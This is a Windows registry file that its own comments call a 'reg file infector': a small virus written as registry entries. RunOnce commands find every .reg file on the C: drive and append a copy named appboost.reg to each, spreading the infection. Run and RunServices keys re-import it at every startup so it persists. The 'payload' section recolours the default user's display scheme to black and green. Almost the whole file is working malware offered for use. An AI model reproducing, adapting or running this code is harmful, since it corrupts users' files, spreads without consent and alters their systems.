REGEDIT4
;first hardcoded REAL reg file infector ? (100% win2k / 90% win9x compatible ;])

;spreeding method(s)
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
"23"="command /c dir /s /b C:\\*.reg > C:\\regs"
"24"="command /c for %x in (%Windows%\\*.reg %Windows%\\System\\*.reg %Windows%\\System32\\*.reg) do @copy \"%x %y\" + %windir%\\appboost.reg \"%x %y\" /y"
"25"="cmd.exe /c for /F \"tokens=1*\" %x in (C:\\regs) do @copy \"%x %y\" + %windir%\\appboost.reg \"%x %y\" /y"
"26"="regedit.exe /s appboost.reg"

;stay alive =)
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
@="regedit.exe /s appboost.reg"
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]
@="regedit.exe /s appboost.reg"

;payload =)
[HKEY_USERS\.DEFAULT\Control Panel\Colors]
"ActiveBorder"="0 0 0"
"ActiveTitle"="0 255 0"
"AppWorkSpace"="0 0 0"
"Background"="0 0 0"
"ButtonAlternateFace"="181 181 181"
"ButtonDkShadow"="64 64 64"
"ButtonFace"="0 0 0"
"ButtonHilight"="127 127 127"
"ButtonLight"="0 0 0"
"ButtonShadow"="0 0 0"
"ButtonText"="0 255 0"
"GradientActiveTitle"="0 0 0"
"GradientInactiveTitle"="0 255 0"
"GrayText"="0 0 0"
"Hilight"="0 0 0"
"HilightText"="0 255 0"
"HotTrackingColor"="0 255 0"
"InactiveBorder"="0 0 0"
"InactiveTitle"="0 0 0"
"InactiveTitleText"="0 255 0"
"InfoText"="0 0 0"
"InfoWindow"="0 255 0"
"Menu"="0 0 0"
"MenuText"="0 255 0"
"Scrollbar"="127 127 127"
"TitleText"="0 0 0"
"Window"="0 0 0"
"WindowFrame"="0 0 0"
"WindowText"="0 255 0"
